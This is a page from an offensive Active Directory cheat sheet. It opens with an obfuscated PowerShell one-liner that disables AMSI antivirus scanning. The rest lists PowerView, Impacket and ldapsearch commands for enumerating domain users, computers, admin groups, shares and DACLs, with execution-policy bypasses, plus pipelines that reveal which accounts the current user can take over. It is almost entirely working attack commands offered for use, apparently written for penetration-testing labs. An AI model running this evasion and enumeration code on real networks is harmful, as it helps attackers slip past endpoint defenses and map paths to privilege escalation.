---
layout: page
title: "# Enum Users / Computers / Shares / DACL Commands"
permalink: /ad_cheatsheets/enum_users_computers_shares_dacl_commands
---

# Enum Users / Computers / Shares / DACL Commands
# Bypass AMSI antivirus

```powershell
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

```markdown
. .\powerview.ps1
```

## Enum Users

```powershell
#PowerView
Get-NetUser | select samaccountname

#Impacket
python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 172.16.75.168 complyedge.com/pete

#LDAP Search - Users incl. extended info
ldapsearch -Y GSSAPI -H ldap://dmzdc01.complyedge.com -D "pete@complyedge.com" -W -b "dc=complyedge,dc=com" '(&(objectClass=user))'
```

## Enum Computers

```powershell
#PowerView
Get-NetComputer

#LDAP Search - Computers incl. extended info
ldapsearch -Y GSSAPI -H ldap://dmzdc01.complyedge.com -D "pete@complyedge.com" -W -b "dc=complyedge,dc=com" '(&(objectClass=computer))'
```

## Enum Members of Domain Admin Group

```powershell
Get-NetGroupMember -GroupName "Domain Admins"
```

## Enum Members of Ent. admin

```powershell
Get-NetGroupMember -GroupName "Enterprise Admins" -Domain moneycorp.local
```

## Enum Shares

```powershell
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC
```

## Enum DACL

```powershell
powershell -ep bypass
. .\powerview.ps1
Get-ObjectAcl -Identity %username%
```

## Convert SID

```powershell
powershell -ep bypass
. .\powerview.ps1
ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-553
```

## Enum DACL and convert SID

```powershell
Get-ObjectAcl -Identity %USERNAME% -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
```

### Get all ACE's of all domain users and resolve the SID - Then filter on usernames that match our current user as set in the $env:UserDomain and $env:Username environment variables

This shows us the accounts our current user has elevated privileges over:

```powershell
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

Do the same with domain groups:

```powershell
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

## Resources:

[PowerView: Active Directory Enumeration](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-enumeration-with-powerview)

[PowerView-3.0 tips and tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
